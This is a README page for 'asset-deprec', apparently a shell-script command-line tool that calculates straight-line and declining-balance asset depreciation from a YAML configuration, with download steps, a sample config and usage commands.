---
layout: "default"
title: "📈 asset-deprec - Simple Asset Depreciation Tracking Tool"
description: "📊 Calculate asset depreciation easily with this shell script, using YAML data for accuracy and customizable reporting methods."
---
# 📈 asset-deprec - Simple Asset Depreciation Tracking Tool

## 🛠️ Introduction

Welcome to **asset-deprec**! This tool helps you calculate the depreciation of your assets easily using two methods: Straight-Line and Declining Balance. With clear, monthly reports and easy YAML configuration, managing your finances is straightforward.

## 🔗 Download Now

[![Download asset-deprec](https://img.shields.io/badge/Download%20asset--deprec-brightgreen)](https://github.com/Pilotyoussef2663/asset-deprec/releases)

## 🚀 Getting Started

To get started with **asset-deprec**, follow these simple steps. Don't worry; you don't need any technical knowledge.

1. **Visit the Releases Page**  
   Click this link to go to the [Releases page](https://github.com/Pilotyoussef2663/asset-deprec/releases).

2. **Download the Latest Version**  
   Look for the most recent version listed. You will usually see a file ending with `.tar.gz` or `.zip`. Click on it to download.

3. **Extract the File**  
   Once the download is complete, you will need to extract the file:
   - On Windows, right-click the downloaded file and select "Extract All."
   - On macOS or Linux, double-click the file to extract it.

4. **Open the Terminal**  
   This tool runs from the command line. On Windows, open Command Prompt. On macOS or Linux, open your Terminal application.

5. **Navigate to the Folder**  
   Use the `cd` command to change to the directory where you extracted the files. For example:
   ```bash
   cd path/to/extracted/folder
   ```

## ⚙️ System Requirements

- Operating System: Windows, macOS, or Linux
- Basic command-line knowledge (follow the steps above)
- A YAML-compatible environment for configuration

## 📚 Features

- **Two Calculation Methods**: Choose between Straight-Line and Declining Balance methods.
- **Monthly Reporting**: Get a clear report on asset depreciation every month.
- **YAML Configuration**: Easily adjust settings using a simple YAML file.
- **CLI-Based**: Fast and efficient way to calculate depreciation without a GUI.

## 📥 Download & Install

To download **asset-deprec**, go to the [Releases page](https://github.com/Pilotyoussef2663/asset-deprec/releases) again and select the latest `.tar.gz` or `.zip` file. Follow the extraction and terminal navigation steps to set up the application.

## 🔍 Usage Instructions

1. **Run the Tool**  
   After navigating to the folder, you can run the application by typing:
   ```bash
   ./asset-deprec
   ```

2. **Configure YAML File**  
   Make sure to create or modify the `config.yaml` file within the extracted directory. This file holds all necessary parameters for your asset calculations. Follow the format outlined below:
   ```yaml
   assets:
     - name: "Asset 1"
       purchase_price: 10000
       lifespan_years: 5
     - name: "Asset 2"
       purchase_price: 5000
       lifespan_years: 3
   ```

3. **Viewing Reports**  
   After setting up your assets, run the command again. The tool will generate a report in the same folder, showing your assets' depreciation.

## 🧩 Useful Commands

- To show commands and options:
  ```bash
  ./asset-deprec --help
  ```

- To generate a report:
  ```bash
  ./asset-deprec --generate-report
  ```

## ✨ Contributing

If you would like to contribute to **asset-deprec**, please feel free to fork the repository and submit a pull request. Everyone is welcome to help make this tool even better!

## 🌍 Topics

Here are some relevant topics associated with **asset-deprec**:

- accounting
- asset-management
- automation
- bash
- budgeting
- cli-tool
- depreciation-calculator
- finance-tools
- shell-script
- yaml

For further details and updates, regularly check our [Releases page](https://github.com/Pilotyoussef2663/asset-deprec/releases). Your feedback and suggestions are valuable.

Happy calculating!